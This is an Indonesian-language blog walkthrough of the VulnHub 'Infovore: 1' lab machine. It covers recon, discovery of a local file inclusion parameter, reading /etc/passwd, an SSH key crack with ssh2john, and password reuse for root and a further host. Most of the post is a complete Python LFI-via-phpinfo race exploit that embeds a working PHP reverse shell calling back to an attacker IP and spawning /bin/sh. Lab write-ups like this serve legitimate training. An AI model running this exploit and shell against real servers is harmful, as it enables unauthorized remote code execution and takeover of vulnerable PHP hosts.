---
layout: post
title: 'VulnHub - Infovore: 1'
date: 2020-06-29 20:55:00 +0800
categories: [vulnhub] 
tags: [LFI, RCE]
---

(Old-Post)
Seperti biasa, latian kecil-kecilan bersama mesin baru di [VH](https://vulnhub.com) karna sudah mumet dan rada males dengan mesin-mesin di [HTB](https://hackthebox.eu). Malas karena difficulty yang tidak setara denga skill saya yang masih rendah. Easy = Medium, Medium = Hard dst. Daripada basa basi tidak jelas mending simak writeup yang satu ini. Selamat Membaca.

**[Infovore: 1](https://www.vulnhub.com/entry/infovore-1,496/)**

## NetDiscover ?
kayanya mesin / box kali ini gk perlu pake `NetDiscover` karena sudah tercantum dari sananya heheh. 
<p align="left">
<img src="https://i.gyazo.com/85f9bf01f011cc4f5c263f5d753c70c8.png">
</p>

# Recon
## Nmap
`rustscan -T 1500 -- A -sC -sV -oN infovore.scan 192.168.59.129`
```bash
┌──[root@skofos]──[~/Desktop/vh/infovore]                                                                                                                                                 
└──# cat infovore.scan                                                                                                                                                                    
# Nmap 7.80 scan initiated Mon Jul 27 12:59:55 2020 as: nmap -A -sC -sV -oN infovore.scan -Pn -vvv -p 80 192.168.59.129                                                                   
Nmap scan report for 192.168.59.129                                                                                                                                                       
Host is up, received user-set (0.0020s latency).                                                                                                                                          
Scanned at 2020-07-27 12:59:57 EDT for 8s                                                                                                                                                 
                                                                                                                                                                                          
PORT   STATE SERVICE REASON          VERSION                                                                                                                                              
80/tcp open  http    syn-ack ttl 128 Apache httpd 2.4.38 ((Debian))                                                                                                                       
| http-methods:                                                                                                                                                                           
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                              
|_http-server-header: Apache/2.4.38 (Debian)                                                                                                                                              
|_http-title: Include me ...                                                                                                                                                              
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                     
Device type: WAP                                                                                                                                                                          
Running: Actiontec embedded, Linux                                                                                                                                                        
OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel                                                                                                                          
OS details: Actiontec MI424WR-GEN3I WAP                                                                                                                                                   
TCP/IP fingerprint:                                                                                                                                                                       
OS:SCAN(V=7.80%E=4%D=7/27%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=5F1F0815%P=x8                                                                                                               
OS:6_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=FF%TI=I%II=I%SS=S%TS=U)OPS(O1=M5B4                                                                                                               
OS:%O2=M5B4%O3=M5B4%O4=M5B4%O5=M5B4%O6=M5B4)WIN(W1=FAF0%W2=FAF0%W3=FAF0%W4=                                                                                                               
OS:FAF0%W5=FAF0%W6=FAF0)ECN(R=Y%DF=N%TG=80%W=FAF0%O=M5B4%CC=N%Q=)T1(R=Y%DF=                                                                                                               
OS:N%TG=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=N%TG=80%W=FAF0%S=O%A=S+%F                                                                                                               
OS:=AS%O=M5B4%RD=0%Q=)T4(R=Y%DF=N%TG=80%W=7FFF%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=                                                                                                               
OS:Y%DF=N%TG=80%W=7FFF%S=A%A=Z%F=R%O=%RD=0%Q=)U1(R=N)IE(R=Y%DFI=N%TG=80%CD=                                                                                                               
OS:S)                                                                                                                                                                                     
                                                                                                                                                                                          
Network Distance: 2 hops                                                                                                                                                                  
TCP Sequence Prediction: Difficulty=254 (Good luck!)                                                                                                                                      
IP ID Sequence Generation: Incremental                                                                                                                                                    
                                                                                                                                                                                          
TRACEROUTE (using port 80/tcp)                                                                                                                                                            
HOP RTT     ADDRESS                                                                                                                                                                       
1   1.12 ms 192.168.172.2                                                                                                                                                                 
2   1.47 ms 192.168.59.129                                                                                                                                                                
                                                                                                                                                                                          
Read data files from: /usr/bin/../share/nmap                                                                                                                                              
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                     
# Nmap done at Mon Jul 27 13:00:05 2020 -- 1 IP address (1 host up) scanned in 10.95 seconds
```
kalo diliat-liat ini cuma web sederhana yang dibuat dari template" bootstrap. ga ada yang menarik lagian cuma one page doang.

## Gobuster
`gobuster dir http://192.168.59.129 -w /usr/share/wordlists/dirb/common.txt -o infovore.gobuster`
```bash
/.hta (Status: 403)                                                                                                                                                                       
/.hta.php (Status: 403)                                                                                                                                                                   
/.hta.html (Status: 403)                                                                                                                                                                  
/.hta.bak (Status: 403)                                                                                                                                                                   
/.hta.txt (Status: 403)                                                                                                                                                                   
/.hta.php.bak (Status: 403)                                                                                                                                                               
/.htaccess (Status: 403)                                                                                                                                                                  
/.htaccess.php (Status: 403)                                                                                                                                                              
/.htaccess.html (Status: 403)                                                                                                                                                             
/.htaccess.bak (Status: 403)                                                                                                                                                              
/.htaccess.txt (Status: 403)                                                                                                                                                              
/.htaccess.php.bak (Status: 403)                                                                                                                                                          
/.htpasswd (Status: 403)                                                                                                                                                                  
/.htpasswd.php (Status: 403)                                                                                                                                                              
/.htpasswd.html (Status: 403)                                                                                                                                                             
/.htpasswd.bak (Status: 403)                                                                                                                                                              
/.htpasswd.txt (Status: 403)                                                                                                                                                              
/.htpasswd.php.bak (Status: 403)                                                                                                                                                          
/css (Status: 301)                                                                                                                                                                        
/img (Status: 301)                                                                                                                                                                        
/index.html (Status: 200)                                                                                                                                                                 
/index.php (Status: 200)                                                                                                                                                                  
/index.html (Status: 200)                                                                                                                                                                 
/index.php (Status: 200)                                                                                                                                                                  
/info.php (Status: 200)                                                                                                                                                                   
/info.php (Status: 200)                                                                                                                                                                   
/server-status (Status: 403)                                                                                                                                                              
/vendor (Status: 301)
```
wakakakak apaa niiihhh, `index.php``info.php` :D, sepertinya menariikk. wah wah wajib diliat niih.
<div align="left">
<img src="https://i.postimg.cc/1zvCPFXK/somethingphp.png">
</div>

# Wfuzz
```bash
┌──[root@skofos]──[~/Desktop/vh/infovore]                                                                                                                                               
└──# wfuzz -u 'http://192.168.59.129/index.php?FUZZ=/etc/passwd/' -w /root/Desktop/tools/SecLists/Discovery/Web-Content/burp-parameter-names.txt --hw 382                               
                                                                                                                                                                                        
Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.                               
                                                                                                                                                                                        
********************************************************                                                                                                                                
* Wfuzz 2.4.5 - The Web Fuzzer                         *                                                                                                                                
********************************************************                                                                                                                                
                                                                                                                                                                                        
Target: http://192.168.59.129/index.php?FUZZ=/etc/passwd/                                                                                                                               
Total requests: 2588                                                                                                                                                                    
                                                                                                                                                                                        
===================================================================                                                                                                                     
ID           Response   Lines    Word     Chars       Payload                                                                                                                           
===================================================================                                                                                                                     
                                                                                                                                                                                        
000000072:   200        7 L      9 W      80 Ch       "filename"                                                                                                             

Total time: 10.46127                                                                                                                                                                    
Processed Requests: 2588                                                                                                                                                                
Filtered Requests: 2587                                                                                                                                                                 
Requests/sec.: 247.3886
```
yep, interesting. lalu saya coba. and boom.
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```
suatu informasi yang sangat bermafaat. wekekekeke.

# LFI to RCE Exploit

dugaan saya benar ini adalah LFI (Local File Inclusion) dari yang saya pelajari ini biasanya ditemukan di PhpInfo" gitu tau dah heheheh, saya cari di github. Apakah ada tools yang bisa mengeksekusi / mengexploitasi. wah akhirnya ketemu juga. [LFI-PhpInfo-RCE](https://github.com/M4LV0/LFI-phpinfo-RCE/).
lalu kode tools itu saya modifikasi sedikit menjadi seperti ini.
```py
#!/usr/bin/python 



import sys
import threading
import socket

def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.59.132';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
//
// Daemonise ourself if possible to avoid zombies later
//
// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}
	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
// Change to a safe directory
chdir("/");
// Remove any umask we inherited
umask(0);
//
// Do the reverse shell...
//
// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}
// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}
// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}
	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}
	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}
	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}
	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?> 
\r""" % TAG
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 6000
    REQ1="""POST /info.php?a="""+padding+""" HTTP/1.1\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /index.php?filename=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =&gt")
        fn = d[i+17:i+31]
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break                
                if x:
                    print "\nGot it! Shell created in /tmp/g"
                    self.event.set()
                    
            except socket.error:
                return
    

def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(phpinforeq)
    
    d = ""
    while True:
        i = s.recv(4096)
        d+=i        
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")
    
    print "found %s at %i" % (d[i:i+10],i)
    # padded up a bit
    return i+256

def main():
    
    print "LFI With PHPInfo()"
    print "-=" * 30

    if len(sys.argv) < 2:
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)
    
    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",  
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 2000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()
    
    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__=="__main__":
    main()
```
dan ya, setelah itu saya jalankan exploitnya seperti ini, `python exploit.py 192.168.59.129 80 10` dan jangan lupa jalankan juga `netcat` agar saling terhubung satu sama lain.
<p align="left">
<img src="https://i.postimg.cc/CKrym2jS/gyazo.png">
</p>

# Getting Flag

## 1st Flag
pergi ke tempat directory asal dimana web itu dibuat `/var/www/html/` and boom, we got the flag (.user.txt).
<p align="left">
	<img src="https://i.gyazo.com/ab9d713f766b4f6db7fb7fec4e323ee8.png">
</p>

## 2nd Flag
flag yang kedua, oke kembali ke direct paling awal `/` setelah itu saya ketik command `ls -la` untuk melihat semua file/folder yang ada. and then saya menjumpai sebuah file `.oldkeys.tgz`, karena curiga saya coba buka di folder `/tmp`. saya extract dengan command `tar -xzf .oldkeys.tgz` dan menemukan sebuah file yang bernama `root`. nah itulah tujuan saya hiyahiya langsung dpt aja. setelah saya buka ternyata berisikan `ssh` yang terenkripsi.
<p align="left">
	<img src="https://i.gyazo.com/544c8fed461556f974edd4a3dc78bdf0.png">
</p>

karena merepotkan saya coba untuk menggunakan `ssh2john.py` sebagai alat yang pandai dalam mengecrack sebuah string yang terenkripsi.
<p align="left">
	<img src="https://i.gyazo.com/a1d8c867e8753fed716aeb348d04f8db.png">
</p>
<p align="left">
	<img src="https://i.gyazo.com/e82c0fba38ef10d300be2f012ad3c8eb.png">
</p>

dan boom, password sudah terpecahkan. mari kita login dengan user `root` access. 
`su -P root`, lalu masukkan password tadi.
<p align="left">
	<img src="https://i.gyazo.com/5017165b1ec3978eac08f67003fdacce.png">
</p>

we got the 2nd flag.

## 3rd Flag

saya kira udah selesai ternyata belom pas saya iseng nyari" sesuatu yang bisa disebut dengan easter egg. taunya malah nemu file `.ssh` lengkap dengan `id_rsa` & `id_rsa.pub`. wah curiga apakah ada user lainnya atau bagaimana? saya juga tak paham waktu itu, lalu saya buka `id_rsa.pub` dan muncullah `admin@192.168.150.1`. Saya kaget dan batin "loh masih ada lagi toh? kirain dah selesai".
lalu saya masuk menggunakan ssh dengan user `admin` yang tertulis.
`ssh admin@192.168.150.1` bingung nyari passwordnya gimana, udah 5 menit lebih nyari g ada yang ketemu terus kepikiran coba pake password yang tadi aja.
eh kntl ternyata bisa wkekekek.
<p align="left">
	<img src="https://i.gyazo.com/1c61353f7943560fb40cd69c442c63b9.png">
</p>

## 4th Flag

<p align="left">
	<img src="https://i.gyazo.com/c56663abb5770757eec738f5bfce25d4.png">
</p>
<p align="left">
	<img src="https://i.gyazo.com/cf316cdd621671dd4bbf860c0580a4dd.png">
</p>

